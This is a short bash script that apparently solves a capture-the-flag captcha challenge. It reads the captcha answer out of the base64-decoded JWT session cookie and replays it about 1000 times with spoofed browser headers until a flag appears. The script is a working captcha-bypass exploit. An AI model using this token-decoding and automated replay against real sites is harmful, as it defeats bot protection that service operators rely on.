#!/bin/bash

# Command to get first JWT token
INITIAL_JWT=$(curl -s -i "https://captchagame-7ooyqi3opa-uc.a.run.app/" | grep "session=" | cut -d "=" -f 2 | awk '{print $1}' | tr -d ";")

#printf $JWT



JWT=$INITIAL_JWT
printf "\n# FIRST JWT => $JWT \t\t#\n\n"

for req in {1..1000}
    do
        printf "\n# REQUEST => $req \t\t#\n"
       
        
        # Get last captcha from JWT token
        LAST_CAPTCHA=$(echo $JWT | base64 -d 2>&1 | grep "last" | cut -d ":" -f 2 | cut -d "," -f 1 | tr -d "\"")   
        
        printf "\n# LAST CAPTCHA => $LAST_CAPTCHA \t\t#\n"

        JWT=$(curl -s -i "https://captchagame-7ooyqi3opa-uc.a.run.app/" -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: pt-BR,en-US;q=0.8,pt;q=0.5,en;q=0.3' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Alt-Used: captchagame-7ooyqi3opa-uc.a.run.app' -H 'Connection: keep-alive' -H "Cookie: session=$JWT" -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -d "response=$LAST_CAPTCHA" | grep "session=" | cut -d "=" -f 2 | awk '{print $1}' | tr -d ";")

        printf "\nLAST JWT => $JWT \t\t#\n"

        if [ $req -ge 990 ]
            then
                printf "# Waiting for FLAG!!        #\n"
                curl -s -i "https://captchagame-7ooyqi3opa-uc.a.run.app/" -H "Cookie: session=$JWT"
        fi
         # GET STATUS
        printf "# STATUS \t\t#\n"
        curl -s -i "https://captchagame-7ooyqi3opa-uc.a.run.app/" -H "Cookie: session=$JWT" | grep "score" | awk '{print $3 $4}'
        printf "\n\n"

        printf "Waiting 5s for next request... \n"
        sleep 5
        printf "\n ###################################\n\n"

    
done
